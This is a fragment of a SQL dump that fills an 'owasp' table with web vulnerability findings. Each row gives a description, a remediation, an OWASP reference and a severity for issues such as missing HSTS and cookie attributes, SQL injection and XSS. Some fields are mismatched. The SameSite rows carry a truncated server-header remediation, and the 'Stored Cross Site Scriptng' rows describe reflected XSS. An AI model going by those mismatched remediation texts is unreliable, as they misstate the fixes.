(292, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 218, 'Low'),
(293, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 219, 'Medium'),
(294, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 219, 'Low'),
(295, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 219, 'Low'),
(296, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 219, 'Low'),
(297, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 219, 'Low'),
(298, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 220, 'Low'),
(299, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 220, 'Low'),
(300, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 220, 'Low'),
(301, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 220, 'Low'),
(302, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 221, 'Medium'),
(303, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 221, 'Low'),
(304, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 221, 'Low'),
(305, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 221, 'Low'),
(306, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 221, 'Low'),
(307, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 222, 'Low'),
(308, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 222, 'Low'),
(309, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 222, 'Low'),
(310, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 222, 'Low'),
(311, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 224, 'High'),
(312, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 224, 'High'),
(313, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 224, 'Medium'),
(314, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 224, 'Low'),
(315, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 224, 'Low'),
(316, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 224, 'Low'),
(317, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 224, 'Low'),
(318, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 223, 'Medium'),
(319, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 223, 'Low'),
(320, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 223, 'Low'),
(321, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 223, 'Low'),
(322, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 223, 'Low');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(323, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 228, 'Low'),
(324, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 228, 'Low'),
(325, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 228, 'Low'),
(326, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 228, 'Low'),
(327, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 233, 'Medium'),
(328, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 233, 'Low'),
(329, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 233, 'Low'),
(330, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 233, 'Low'),
(331, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 233, 'High'),
(332, 'Web Application Framework Infomation Leakage', 'There is nothing new under the sun, and nearly every web application that one may think of developing has already been developed. With the vast number of free and Open Source software projects that are actively developed and deployed around the world, it is very likely that an application security test will face a target that is entirely or partly dependent on these well known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested significantly helps in the testing process and will also drastically reduce the effort required during the test. These well known web applications have known HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most of the web frameworks have several markers in those locations which help an attacker or tester to recognize them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy several markers are usually used.', 'While efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc. such efforts boil down to “security through obscurity”. System owners/admins should recognize that those efforts only slow down the most basic of adversaries. The time/effort may be better used on stakeholder awareness and solution maintenance activities.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework', NULL, 'WSTG-INFO-08', 215, 'Low'),
(333, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 